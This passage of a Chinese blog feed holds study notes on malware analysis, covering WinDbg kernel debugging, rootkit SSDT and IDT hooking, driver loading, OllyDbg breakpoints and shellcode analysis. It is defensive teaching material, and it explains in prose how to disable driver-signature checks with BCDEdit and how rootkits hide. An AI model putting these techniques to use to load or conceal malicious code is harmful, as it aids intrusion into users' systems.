id="10x5-内核调试实践"><a href="#10x5-内核调试实践" class="headerlink" title="10x5 内核调试实践"></a>10x5 内核调试实践</h2><p>对于恶意代码编码者，从内核空间写文件的好处是更加难以被觉察。虽然不是以秘密方式写入一个文件，但是它可以绕过一些安全产品，同时也可以误导那些试图查找用户空间中CreateFile、WriteFile函数调用证据的恶意代码分析师。呈现在恶意代码编写者面前的一个挑战是：在内核模式中，普通Win32函数不能直接被调用。但在内核模式下有相似的函数，这些函数可以被内核态的恶意代码所使用。由于CreateFile和WriteFile函数在内核模式下不可用，所以内核模式下提供NtCreateFile和NtWriteFile函数作为替代。</p><h3 id="1-用户空间的代码"><a href="#1-用户空间的代码" class="headerlink" title="1. 用户空间的代码"></a>1. 用户空间的代码</h3><h3 id="2-内核模式的代码"><a href="#2-内核模式的代码" class="headerlink" title="2. 内核模式的代码"></a>2. 内核模式的代码</h3><h3 id="3-查找驱动对象"><a href="#3-查找驱动对象" class="headerlink" title="3. 查找驱动对象"></a>3. 查找驱动对象</h3><h2 id="10x6-Rootkit"><a href="#10x6-Rootkit" class="headerlink" title="10x6 Rootkit"></a>10x6 Rootkit</h2><p>Rootkit通过修改操作系统内部函数,来隐藏自己存在的痕迹。通过这种修改, Rootkit可以隐藏一个正在运行程序的文件、进程、网络连接以及其他资源。这使得其恶意活动难以被反病毒产品、管理员以及安全分析员发现。</p><p>现在大部分 Rootkit都是通过采用某种方式修改操作系统内核来工作的。尽管 Rootkit可以使用多种隐藏技术,但在实际应用中,系统服务描述表(SSDT: System Service Descriptor Table)挂钩技术的使用程度远远超过其他技术。这种技术已经有几年的历史,与其他 rootkits技术相比,它更容易被探测。然而,由于它容易理解、实现灵活且容易,因此到现在它依然被恶意代码所使用。</p><p>系统服务描述表(SSDT),也称为系统服务分发表,微软使用它来查找进入内核的系统调用,它通常不被第三方应用程序或者驱动程序访问。内核态代码只能被用户态的<br>SYSCALL、 SYSENTER或INT 0x2E指令来访问。当前 Windows版本( Windows XP之后)使用 SYSENTER指令,它从存储在寄存器EAX的函数代码中获取指令。</p><h3 id="1-Rootkit分析实践"><a href="#1-Rootkit分析实践" class="headerlink" title="1. Rootkit分析实践"></a>1. Rootkit分析实践</h3><blockquote><p>一个 Rootkit挂钩SSDT的例子</p></blockquote><p>分析一个假设已感染的系统,并认为系统已经安装有恶意驱动。</p><p>首先最直接的方式是检查SSDT是否被挂钩,在 WinDbg中通过存放在nt!KeServiceDescriptorTable表中的偏移量查看SSDT表。SSDT表中所有函数偏移量都应该指向位于NT模块地址范围内的函数,所以我们首先要做的工作就是获取NT模块的地址边界。如果 Rootkit挂钩了其中的某个函数,则这个函数指针可能不在NT模块的地址范围内。当我们检查SSDT时,应该观察其函数指针是否在NT模块的地址范围内。</p><h3 id="2-中断"><a href="#2-中断" class="headerlink" title="2. 中断"></a>2. 中断</h3><p>有时．Rootkit会使用中断来干扰系统事件。现代的处理器实现了用硬件方式触发软件事件的中断。系统发送一条命令到硬件，硬件处理完请求事件后会中断处理器。</p><p>有时，驱动或者Rootkit会利用中断来执行代码，驱动程序调用IoConnectlnterrupt函数为特定中断注册一个处理程序，然后为这个中断指定一个中断服务例程(ISR)，每当触发该中断时，系统都会调用注册的中断服务例程。</p><p>中断描述表(IDT)存储着ISR的信息，在WinDbg中可以通过lidt命令查看</p><p>如果中断位于一个没有名字、没有签名或可疑的驱动中,则表明存在 Rootkit或者恶意代码。</p><h2 id="10x7-加载驱动"><a href="#10x7-加载驱动" class="headerlink" title="10x7 加载驱动"></a>10x7 加载驱动</h2><p>假设你拥有一个恶意的驱动程序,但没有用户态应用程序安装它,这个时候就可以用如 OSR Driver Loader的加载工具来加载它。 OSR Driver Loader驱动加载器非常容易使用而且免费,但需要注册。一旦安装了 OSR Driver Loader,只需在它运行后指定需要加载的驱动,然后单击 Register Service和 Start Service就可以启动驱动。</p><h2 id="10x8-Windows-vista、-Windows7和x64版本的内核问题"><a href="#10x8-Windows-vista、-Windows7和x64版本的内核问题" class="headerlink" title="10x8 Windows vista、 Windows7和x64版本的内核问题"></a>10x8 Windows vista、 Windows7和x64版本的内核问题</h2><p>Vista及之后的Windows版本使用一个名为BCDEdit的程序来编辑引导配置数据，因此你可以在新版本的Windows操作系统中，使用BCDEdit开启内核调试。</p><p>在安全方面，最大的改变是使用了一种内核保护补丁机制，通常被称为PatchGuard，这种机制从Windows XP开始在x64系统上实施。内核补丁保护能够阻止第三方程序修改内核，这包括修改内核代码自身、修改系统服务表、修改IDT以及其他补丁修改技术。引入这种功能时存在一定程度上的争议，因为不仅恶意程序使用内核补丁，正常程序也使用它。</p><p>同时，在64位系统中，内核补丁保护也能干扰调试过程，因为调试器在插入断点时会修改代码。因此．如果内核调试器在系统引导时附加到系统的话，补丁保护将不会运行。如果系统引导结束后再将内核调试器附加到系统．PatchGuard将会使系统崩溃。</p><p>从64位版本的Vista开始．Windows强制执行驱动签名机制，这也就意味着在没有数字签名的情况下，你不能将驱动加载到Windows Vista系统中。因为恶意代码通常不会使用数字签名，所以这是一种对抗恶意内核驱动的有效安全措施。事实上．x64系统上的恶意内核驱动实际上还不存在，但是随着x64版本的Windows越来越普及，恶意代码无疑将会解决这一个障碍。如果你需要加载一个未签名的驱动到x64的Vista系统中，你可以使用BCDEdit工具去修改引导项。具体来说就是将要求驱动签名的功能关闭，即关闭nointegritychecks。</p><p>From <a href="https://kabeor.github.io/第10章  使用WinDbg调试内核/">https://kabeor.github.io/第10章  使用WinDbg调试内核/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第10章-使用WinDbg调试内核&quot;&gt;&lt;a href=&quot;#第10章-使用WinDbg调试内核&quot; class=&quot;headerlink&quot; title=&quot;第10章  使用WinDbg调试内核&quot;&gt;&lt;/a&gt;第10章  使用WinDbg调试内核&lt;/h1&gt;&lt;p&gt;本章将探索使用W
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第9章 OllyDbg</title>
    <link href="https://kabeor.github.io/%E7%AC%AC9%E7%AB%A0%20OllyDbg/"/>
    <id>https://kabeor.github.io/第9章 OllyDbg/</id>
    <published>2018-07-20T03:35:55.262Z</published>
    <updated>2018-07-22T10:31:28.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h1><p>OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security公司买下 OllyDbg1.1的基础代码,并将其更名为Immunity Debugger(ImmDbg)。在此之前, OllyDbg直都是恶意代码分析师和漏洞开发者们的首选调试器。Immunity的目的是使这个工具适合漏洞开发者们使用,并且修复了OllDbg中的一些Bug。<br>在完成 OllyDbg的外观GUI修改,提供带有完整功能的 Python解释器API后,一些用户开始用ImmDbg替代OllyDbg</p><h2 id="9x1-加载恶意代码"><a href="#9x1-加载恶意代码" class="headerlink" title="9x1 加载恶意代码"></a>9x1 加载恶意代码</h2><h3 id="1-打开一个可执行文件"><a href="#1-打开一个可执行文件" class="headerlink" title="1. 打开一个可执行文件"></a>1. 打开一个可执行文件</h3><p>选择OllyDbg界面中的File-&gt;Open, 然后浏览到要加载的可执行文件。<br>如果要调试的程序需要参数,则在Open对话框的 Arguments输入框给出(只能在加载期间给OllyDgb传入命令行参数)</p><p>默认情况下,如果能够确定软件的入口点位置,即 WinMain, OllyDbg会在这个位置暂停程序的执行。否则OllyDbg会在软件PE头部提供的入口点处中断。另外,你也可以选择 OllyDbg的DebuggingOptions菜单(Options→Debugging Options)来修改这些启动选项。</p><h3 id="2-附加调试器到一个运行程序"><a href="#2-附加调试器到一个运行程序" class="headerlink" title="2. 附加调试器到一个运行程序"></a>2. 附加调试器到一个运行程序</h3><p>为将OllyDbg附加到一个进程上,选择OllyDbg界面的File→ Attach。然后会弹出一个菜单,你可以在这个菜单中选择要附加的进程(如果有多个同名的进程,你需要知道调试进程的ID)。接下来选择要调试的进程,并从菜单中选择Attach。此刻OllyDbg会立即暂停这个程序以及它所有的线程。</p><p>OllyDbg附加上进程后,进程当前执行线程的代码会被暂停,并显示在OllyDbg的窗口中。然而，有可能在进程正在执行一个系统DLL中的指令时把它暂停了,当这种情况发生时,回到主代码最简单的办法就是在整个代码段中设置一个访问断点。这样就会让这个程序在下次访问代码段时中断执行。</p><h2 id="9x2-OllyDbg的接口"><a href="#9x2-OllyDbg的接口" class="headerlink" title="9x2 OllyDbg的接口"></a>9x2 OllyDbg的接口</h2><blockquote><p> <strong>反汇编面板窗口</strong><br> 这个窗口显示了被调试程序的代码一当前指令指针的前后一些指令。通常，下一条将要被执行的指令在这个窗口中高亮显示。如果想要修改指令或数据(或添加一些汇编指令),请在这个窗口中按空格键。</p><p><strong>寄存器面板窗口</strong><br>这个窗口用来显示被调试程序寄存器的当前状态，代码被调试时，如果一条指令运行过程中修改了寄存器的值，则寄存器窗口中的这个寄存器就会从黑色变为红色。</p><p><strong>栈面板窗口</strong><br>这个窗口用来显示被调试线程堆栈在内存中的当前状态。这个窗口总是显示给定线程的栈项。可以通过右击一个栈单元，选择Modify，来操作这个窗口中的栈。OllyDbg会在一些栈单元上显示一些有用的注释，这些注释描述了调用一个API之前栈中存放的参数。</p><p><strong>内存转储面板窗口</strong><br>这个窗口用来显示被调试进程的实时内存转储。在这个窗口中按CtrI+G组合键，并输入一个内存位置，可以跳转到任何内存地址（也可以单击一个内存地址，然后选择Follow in Dump，来转储那个内存地址）。如果想要编辑这个窗口中的内存，右击它并选择Binary-&gt;Edit。使用这种方式也可以修改恶意代码存储在RAM中的全局变量以及其他一些数据。</p></blockquote><h2 id="9x3-内存映射"><a href="#9x3-内存映射" class="headerlink" title="9x3 内存映射"></a>9x3 内存映射</h2><p>内存映射窗口( View-&gt;Memory)显示了被调试程序分配的所有内存块。<br>内存映射是查看程序在内存中布局的一个好方式。你可以双击内存映射中的任意一行，显示那个段的内存转储。你也可以通过右击一段内存转储，然后选择View in Disassembler的方式，将其中的数据发送到反汇编窗口。</p><h3 id="1-基地址重定位"><a href="#1-基地址重定位" class="headerlink" title="1. 基地址重定位"></a>1. 基地址重定位</h3><p>内存映射能够帮助你理解一个PE文件在运行时如何被重定位。基地址重定位是指Windows中的一个模块没有被加载到其预定基地址时发生的情况。</p><blockquote><p><strong>基地址</strong><br>   Windows中的所有PE文件都有一个预定的基地址，它在PE文件头中被称为映像基地址。</p><p>  Windows允许映像基地址与要被加载到内存的实际地址不一致，虽然大部分情况下是一致的。大部分执行程序都被预定加载到0x00400000处，这个地址是Windows平台下大多数编译器使用的默认地址。不过，开发者可以选择将执行程序的基地址设置为一个与此不同的地址。支持地址空间布局随机化( ASLR)安全增强特性的可执行程序会经常被重定位。这就是说.DLL的重定位变得更加普遍。<br>    因为一个应用程序可能导入许多DLL，而每个DLL都有一个希望被加载到内存中的预定基地址，所以重定位十分必要。假设有两个DLL被加载，并且它们拥有相同的预加载地址0x10000000，则它们不可能都加载到这个位置,Windows会将其中一个DLL加载到这个地址，另一个DLL重定位到另外某个地址。<br>    Windows操作系统自带的大多数DLL有不同的预定基地址，而且它们之间不会产生冲突。然而第三方应用程序会经常出现使用同一个预定基地址的情况。</p><p><strong>绝对地址与相对地址</strong><br>重定位过程比简单将代码加载到另一个位置要复杂得多。虽然多数指令会引用内存中的相对地址，但是有些却引用内存的绝对地址。</p></blockquote><h2 id="9x4-查看线程和堆栈"><a href="#9x4-查看线程和堆栈" class="headerlink" title="9x4 查看线程和堆栈"></a>9x4 查看线程和堆栈</h2><p>恶意代码经常使用多线程。你可以通过选择View-&gt;Threads，调出线程面板窗口，查看一个程序的当前线程。这个窗口显示了线程的内存位置，以及它们当前的活动状态（活动、暂停，或者挂起）。<br>    由OllyDbg是单线程的，可能需要你先暂停所有的线程，设置一个断点后，继续运行程序，这样可以确保在一个特定线程内调试。单击主工具栏中的暂停按钮，可以暂停所有活动的线程。</p><h2 id="9x5-执行代码"><a href="#9x5-执行代码" class="headerlink" title="9x5 执行代码"></a>9x5 执行代码</h2><p><img src="https://i.loli.net/2018/07/20/5b519235da3c2.jpg" alt="im"></p><h2 id="9x6-断点"><a href="#9x6-断点" class="headerlink" title="9x6 断点"></a>9x6 断点</h2><p><img src="https://i.loli.net/2018/07/20/5b5192c91c650.jpg" alt="enter description here"></p><h3 id="1-软件断点"><a href="#1-软件断点" class="headerlink" title="1. 软件断点"></a>1. 软件断点</h3><p>调试字符串解码函数时，软件断点特别有用。</p><h3 id="2-条件断点"><a href="#2-条件断点" class="headerlink" title="2. 条件断点"></a>2. 条件断点</h3><p>条件断点是软件断点的一种，只有某些条件得到满足时这个断点才能中断执行程序。OllyDbg调试器允许使用表达式，来设置断点，每当断点命中时，都会先计算表达式的值，如果其值不等于零，断点生效，程序运行中断。</p><p>对于调用频繁的API函数，仅当特定参数传给它时才中断程序执行，这种情况下，条件软件断点特别有用。</p><blockquote><p><strong>设置条件断点的步骤</strong></p><ol><li>右击反汇编面板窗口中函数的第一条指令，选择Breakpoint-&gt;Conditional。然后会弹出一个对话框，要求你输入条件表达式.</li><li>在步骤l弹出的对话框中输入表达式，然后单击OK按钮。</li><li>单击Play按钮，并等待条件断点命中。</li></ol></blockquote><h3 id="3-硬件断点"><a href="#3-硬件断点" class="headerlink" title="3. 硬件断点"></a>3. 硬件断点</h3><p>硬件断点非常强大，它可以在不改变你的代码、堆栈以及任何目标资源的前提下进行调试。</p><p>OllyDbg中，在某一指令上设置硬件断点的方法是：右击该指令选择Breakpoint-&gt;Hardware，on Execution。</p><p>通过使用Debugging Options菜单，你可以告诉OllyDbg默认使用硬件断点来代替软件断点。同时，使用硬件断点可以帮助你防御反调试技术，如软件断点扫描。</p><h3 id="4-内存断点"><a href="#4-内存断点" class="headerlink" title="4. 内存断点"></a>4. 内存断点</h3><p>在一个内存块上设置内存断点，可以让被调试程序在访问这段内存时中断执行。OllyDbg支持软件内存断虑和硬件内存断点，此外还支持对内存进行读、写、执行或其他权限访问是否产生中断的设置。</p><p>为了设置一个基本的内存断点，在内存转储面板窗口中选择一部分内存，或者在内存映射面板窗口中选择一个内存段，然后右击它，选择Breakpoint-&gt;Memory,on Access。OllyDbg只允许你一次设置一个内存断点。如果你设置了一个新的内存断点，那么之前设置的内存断点会被移除。</p><p>在分析恶意代码时，如果想知道恶意代码何时使用了某个加载的DLL，这时内存断点将变得特别有用。可以设置这样一个内存断点，当DLL中的代码运行时程序被中断。下面是实现这种功能的步骤：</p><blockquote><p>1．打开内存映射面板窗门，并右i键单击需要跟踪DLL的.text段（.text段包含DLL的可执行代码）。<br>2．选择Set Memory Breakpoint on Access.<br>3．按F9键或者单击Play按钮恢复程序运行。<br>    当心用程序运行到DLL的．text段代码时．会中断执行。</p></blockquote><h2 id="9x7-加载DLL"><a href="#9x7-加载DLL" class="headerlink" title="9x7 加载DLL"></a>9x7 加载DLL</h2><p>除了可以调试加载的或者附加的可执行程序，OllyDbg还可以调试DLL。然而由于DLL不能直接运行．OllyDbg使用了一个名为loaddll. exe的虚拟程序来加载它。由于恶意代码经常打包成DLL．且其大部分代码都包含在DLL的DlIMain函数（DLL的初始化函数，当DLL被加载到进程时被调用）中，因此OllyDbg的这种技术非常有用。默认情况下，一旦DLL被加载，OllyDbg会在DLL的入口点(DllMain)处中断。</p><p>如果要用参数调用被调试DLL中的导出函数，首先用OllyDbg加载DLL．然后在其入口点处暂停DLL的执行，最后单击Play按钮，运行DllMain函数，以及其他一些DLL要求的初始化操作。</p><h2 id="9x8-跟踪"><a href="#9x8-跟踪" class="headerlink" title="9x8 跟踪"></a>9x8 跟踪</h2><p>跟踪是一种强大的调试技术，它可以记录程序详细的运行信息，供你查阅。OllyDbg支持多种跟踪功能，包括：标准回溯跟踪、堆栈调用跟踪和运行跟踪等。</p><h3 id="1-标准回溯跟踪"><a href="#1-标准回溯跟踪" class="headerlink" title="1. 标准回溯跟踪"></a>1. 标准回溯跟踪</h3><p>每次你在反汇编面板窗口上执行Step Into和Step Over操作时，OllyDbg都会记录下这种动作。你可以使用键盘上的减号键（一）。退回到上一步运行的指令：使用加号键(+)．执行下一条指令。<br>如果使用Step Into，你可以跟踪每一步的执行。如果使用Step Over，只能单步跟踪step over之前区域，回溯之后再决定是否进入另一个区域。</p><h3 id="2-堆栈调用跟踪"><a href="#2-堆栈调用跟踪" class="headerlink" title="2. 堆栈调用跟踪"></a>2. 堆栈调用跟踪</h3><p>在OllyDbg中，通过堆栈跟踪可以查看一个给定函数的执行路径。为了查看堆栈调用，在主菜单中选择View-&gt;Call Stack．会弹出一个窗口，窗口中显示了当前位置之前的调用序列。<br>    为了跟踪堆栈调用，单击地址或者堆栈调用窗口中的某段。当你在那个堆栈位置时，寄存器和堆栈并不会显示什么，除非你执行运行跟踪操作。</p><h3 id="3-运行跟踪"><a href="#3-运行跟踪" class="headerlink" title="3. 运行跟踪"></a>3. 运行跟踪</h3><p>运行跟踪是指在运行代码时，OllyDbg会保存所有运行过的指令，以及它们运行过程中对寄存器和标志所做的改变。</p><blockquote><p><strong>几种激活运行跟踪的方法</strong><br>·  在反汇编面板窗口中高亮你要跟踪的代码。右键单击代码，选择Run Trace–Add Selection。代码运行后，选择View-&gt;Run Trace，查看运行过的指令。使用键盘上的一（减号键）和+（加号键），来上下浏览代码（与标准回溯跟踪小节讨论的一样）。使用这种方法，可以查看每条指令执行时所有寄存器发生的变化。<br>    ·  使用Trace Into与Trace Ovcr选项。这些选项比Add Selection更容易使用，因为它们不需要你选择需要跟踪的代码。Trace Into可以单步执行并且记录命中断点前所有的运行指令，但Trace Over仅记录当前正在运行函数的指令。<br>·  选择Select Debug-&gt;Set Condition。可以在命中条件使程序暂停之前，跟踪程序的运行。如果你想在条件断点命中时停止跟踪，并且从发生中断的位置，回溯跟踪查看如何或者为什么发生中断，这种跟踪方法将对你非常有帮助。</p></blockquote><h3 id="4-跟踪Poison-lvy"><a href="#4-跟踪Poison-lvy" class="headerlink" title="4. 跟踪Poison lvy"></a>4. 跟踪Poison lvy</h3><h2 id="9x9-异常处理"><a href="#9x9-异常处理" class="headerlink" title="9x9 异常处理"></a>9x9 异常处理</h2><p>默认情况下．OllyDbg被附加后会产生异常，附加程序也会停止运行，此时调试器开始接管控制权。调试器可以处理该异常，也可以将异常转到被调试的应用程序处理。当异常发生时．OllyDbg会暂停运行，然后你可以使用下列任一种方法，来决定是否将异常转到应用程序处理：</p><blockquote><p>·  Shift+F7将进入异常。<br>·  Shift+F8将跳过异常。<br>·  Shift+F9将运行异常处理。</p></blockquote><p>OllyDbg提供异常处理的选项，这些选项可以告诉调试器忽略某些特定异常，并且将它们直接转到应用程序处理。<br><img src="https://i.loli.net/2018/07/20/5b519f1aae2be.png" alt="im"></p><h2 id="9x10-修补"><a href="#9x10-修补" class="headerlink" title="9x10 修补"></a>9x10 修补</h2><p>OllyDbg可以很容易修改实时数据，如寄存器和标志。它也可以将汇编形式的修补代码直接插入到一个程序。你可以通过高亮选择某块区域来修改指令或内存，右击这块区域，选择Binary-&gt;Edit，会弹出让你添加操作码和数据的窗口（OllyDbg具有一些特殊功能，可以使用00项或NOP指令填充程序）。</p><h2 id="9x11-分析shellcode"><a href="#9x11-分析shellcode" class="headerlink" title="9x11 分析shellcode"></a>9x11 分析shellcode</h2><p>OllyDbg有一种分析shellcodc的简单方法。下面是使用这种方法的步骤:</p><blockquote><p>1．将shellcode从一个十六进制编辑器复制到剪切板。<br>2．在内存映射面板窗口中，选择类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享）。<br>3．双击内存映射面板窗口的某行，会弹出一个十六进制转储窗口，你可以检查它的内容。该区域应该包含几百个连续为0的字节。<br>4．在内存映射面板窗口中，右击被选择的区域，选择Set Access—Full Access，赋予该区域读、写、运行的权限。<br>5．返回内存转储窗口。0字节填充的高亮区域足以容纳整个sheUcode，右键单击选择的内存区域，然后选择Binary一Binary Paste。这个操作将步骤l中复制的shellcode粘贴到选择的区域。<br>6．设置EIP寄存器，指向你修改的内存区域（右击反汇编面板窗口的一条指令，选择New Origin Here，你可以很容易设置EIP寄存器的值）。</p></blockquote><p>上述步骤结束后，你就可以像对待正常应用程序一样运行、调试和单步整个shellcode了</p><h2 id="9x12-协助功能"><a href="#9x12-协助功能" class="headerlink" title="9x12 协助功能"></a>9x12 协助功能</h2><p>OllyDbg提供了多种机制来帮助分析，包括下面几种：</p><blockquote><p>  <strong>日志( Logging)</strong><br>  OllyDbg维护一个持续可用的事件日志。要访问这个日志，选择View-&gt;Log。此日志显示了加载的可执行模块、触发的断点，以及其他一些信息。另外，在分析过程中，日志还可以帮助你找出为到达某一特定状态而执行的那些操作。<br>    <strong>监视(Watches)窗口</strong><br>    OllyDbg支持使用监视窗口，用它可以查看你生成表达式的值。程序运行时，这个表达式会不断更新。你可以通过View—Watches，来访问监视窗口，你也可以在监视窗口中按下空格键，来设置表达式。<br>    <strong>帮助（Help）</strong>  OllyDbg的Help-&gt;Contents选项为运算表达式的书写提供了详细说明。当你想监视一些特定数据或者复杂函数时，这个帮助非常有用。例如，如果想监控EAX+ESP+4处的内存，你只需要输入表达式[EAX+ESP+4]。<br>    <strong>标注（Labeling）</strong>  如IDA Pro一样，你可以为OllyDbg中的子例程和循环添加标注。OllyDbg中的标注是为调试程序中某个地址设置的一个简单符号名称。为了在反汇编面板窗口设置标注，右击一个地址选择Label，此时会弹出提示输入标注的窗口。设置完标注以后，对这个地址的所有引用都会被该标注代替。</p></blockquote><h2 id="9x13-插件"><a href="#9x13-插件" class="headerlink" title="9x13 插件"></a>9x13 插件</h2><p>OllyDbg拥有一些标准插件，其中一些可以免费下载到。在网站 <a href="http://www.openrce.org/downloads/browse/OllyDbg_Plugins" target="_blank" rel="noopener">http://www.openrce.org/downloads/browse/OllyDbg_Plugins</a> 中，你可以找到一些对分析恶意代码有用的OllyDbg插件。<br>    OllyDbg的插件以DLL形式存在，如果要安装某个插件，你将这个插件的DLL放到OllyDbg的安装根目录下即可。一旦将DLL放入OllyDbg的安装根目录，OllyDbg会自动识别这个插件，并将其添加到插件菜单。</p><h3 id="1-OllyDump"><a href="#1-OllyDump" class="headerlink" title="1. OllyDump"></a>1. OllyDump</h3><p>OllyDump是OllyDbg最常使用的插件，它能够将一个被调试的进程转储成一个PE文件。当加载器加载一个可执行文件时，OllyDump会尝试逆向这个进程。然而，OllyDump利用的是进程内存中各段（代码段、数据段等）的状态。OllyDbg最典型的应用就是脱壳。</p><h3 id="2-调试器隐藏插件"><a href="#2-调试器隐藏插件" class="headerlink" title="2. 调试器隐藏插件"></a>2. 调试器隐藏插件</h3><p>调试器隐藏插件用多种方法对探测者隐藏调试器的存在。为了防止恶意代码使用反调试技术，恶意代码分析人员通常在分析恶意代码期间，一直运行调试器隐藏插件。这个插件主要针对IsDebuggerPresent检测、FindWindow检测、未处理异常欺骗以及用OutputDebugString反OllyDbg调试等反调试技术。</p><h3 id="3-命令行"><a href="#3-命令行" class="headerlink" title="3. 命令行"></a>3. 命令行</h3><p>要打开命令行窗口，选择Plugins-&gt;Command  Line-&gt;Command  Line。<br><img src="https://i.loli.net/2018/07/20/5b51a90a13474.jpg" alt="im"></p><h3 id="4-书签"><a href="#4-书签" class="headerlink" title="4. 书签"></a>4. 书签</h3><p>OllyDbg默认情况下自带书签插件，书签插件可以将一个内存位置加到书签中，利用书签，下次不需要记住就可以轻松获取那个内存地址。右击反汇编面板窗口中的地址，选择Bookmark-&gt;Insert Bookmark．可以添加书签。选择Plugins-&gt;Bookmarks-&gt;Bookmarks，可以浏览书签，然后单击书签可以跳转到该书签代表的地址。</p><h2 id="9x14-脚本调试"><a href="#9x14-脚本调试" class="headerlink" title="9x14 脚本调试"></a>9x14 脚本调试</h2><p>因为OllyDbg的插件被编译成DLL，创建或者修改一个插件往往是一个复杂的过程。因此，当需要扩展调试功能时，我们采用ImmDbg。它使用Python脚本来扩展功能，并且提供了易于使用的API接口。<br>    ImmDbg的Python API包含很多实用工具和函数。例如，可以将你的脚本像本地代码一样集成到调试器中，创建自定义的表格、图形和各种接u。利用脚本分析恶意代码的原因有多种，典型的包括反调试器补丁、内联函数钩子( hook)以及函数参数日志等，其中许多代码可以在网上找到。<br>    ImmDbg最常见的Python脚本类型是PyCommand．这个Python脚本位于ImmDbg安装目录下的PyCommands\目录中。编写好Python脚本后，必须将其放到这个目录下才能运行。这些脚本从命令栏运行，并且需要加上前缀“!”，如在命令行中输入!list命令，可以列出可用的PyCommand列表。<br>    PyCommand类型脚本拥有如下结构：</p><blockquote><p>．  一系列Import导入语句，用来导入Python的模块（同所有的Python脚本一样）。通过immlib或immutils模块访问ImmDbg的功能。<br>．    一个主函数，用来读取命令行参数（以Python列表传递）。<br>·  PyCommand的代码实现部分。<br>·  返回包含字符串的值。一旦脚本运行结束，主调试器会用这个返回字符串更新状态栏。</p></blockquote><p>From <a href="https://kabeor.github.io/第9章 OllyDbg/">https://kabeor.github.io/第9章 OllyDbg/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OllyDbg&quot;&gt;&lt;a href=&quot;#OllyDbg&quot; class=&quot;headerlink&quot; title=&quot;OllyDbg&quot;&gt;&lt;/a&gt;OllyDbg&lt;/h1&gt;&lt;p&gt;OllyDbg被普遍用来分析恶意代码之前,最初的用途是破解软件。 Immunity Security
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第8章 动态调试</title>
    <link href="https://kabeor.github.io/%E7%AC%AC8%E7%AB%A0%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>https://kabeor.github.io/第8章 动态调试/</id>
    <published>2018-07-10T07:15:06.123Z</published>
    <updated>2018-07-19T05:23:24.952Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第8章-动态调试"><a href="#第8章-动态调试" class="headerlink" title="第8章 动态调试"></a>第8章 动态调试</h1><h2 id="8x1-源代码级与汇编级的调试器"><a href="#8x1-源代码级与汇编级的调试器" class="headerlink" title="8x1 源代码级与汇编级的调试器"></a>8x1 源代码级与汇编级的调试器</h2><h2 id="8x2-内核模式与用户模式调试"><a href="#8x2-内核模式与用户模式调试" class="headerlink" title="8x2 内核模式与用户模式调试"></a>8x2 内核模式与用户模式调试</h2><p>在用户模式中，调试器与被调试的代码运行在同一个系统中<br>内核模式调试一般需要两个不同的系统<br>WinDbg是当前唯一支持内核调试的流行调试器</p><h2 id="8x3-使用调试器"><a href="#8x3-使用调试器" class="headerlink" title="8x3 使用调试器"></a>8x3 使用调试器</h2><h3 id="1-单步调试"><a href="#1-单步调试" class="headerlink" title="1. 单步调试"></a>1. 单步调试</h3><h3 id="2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into"><a href="#2-单步跳过-Stepping-Over-和单步跳入-Stepping-Into" class="headerlink" title="2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)"></a>2. 单步跳过(Stepping-Over)和单步跳入(Stepping-Into)</h3><blockquote><p>现在是使用VMware record/replay功能的最佳时机。当你单步跳过一个不会返回的函教时，可以通过重放调试会话来纠正你的错误。开始调试时就启动记录。然后，当单步跳过一个不会返回的函数时，停止记录。重放到单步跳过的函数前面，然后停止重放，取得控制权,但这次单步跳入该函数。</p></blockquote><h3 id="3-用断点暂停执行"><a href="#3-用断点暂停执行" class="headerlink" title="3. 用断点暂停执行"></a>3. 用断点暂停执行</h3><blockquote><p>软件执行断点</p></blockquote><p>调试器通过使用0XCC,即指令INT 3的机器码，重写指令的首个字节来实现软件断点，0XCC被设计来供调试器使用。当0XCC指令执行后，操作系统会产生一个异常，然后控制权转到调试器。</p><blockquote><p>硬件执行断点</p></blockquote><p>利用专门的硬件寄存器，x86结构可以支持硬件执行断点。处理器每次执行一个指令时，硬件都会检测指令的指针是否与断点地址相等。硬断点并不关心断点地址存储哪些字节。当调试修改自身的代码时，硬断点会非常有益。硬断点相比于软断点的另一个优点是，它们可以设置访问中断的断点而不是执行中断的断点。</p><p>硬件执行断点有个明显缺点：只有四个硬件寄存器存储断点的地址。<br>硬断点的深层缺陷之一是它们容易被运行的程序修改。虽然CPU芯片有八个调试寄存器，但只有六个在使用。前四个寄存器DR0〜DR3用来存储断点地址，调试控制寄存器（DR7)存储DR0〜DR3寄存器中的值是否有效，以及它们是否表示读、写或者执行断点等信息。恶意代码可以修改这些寄存器来干扰调试器。x86芯片组具有防御该干扰的功能。通过设置DR7寄存器中的通用探测（General 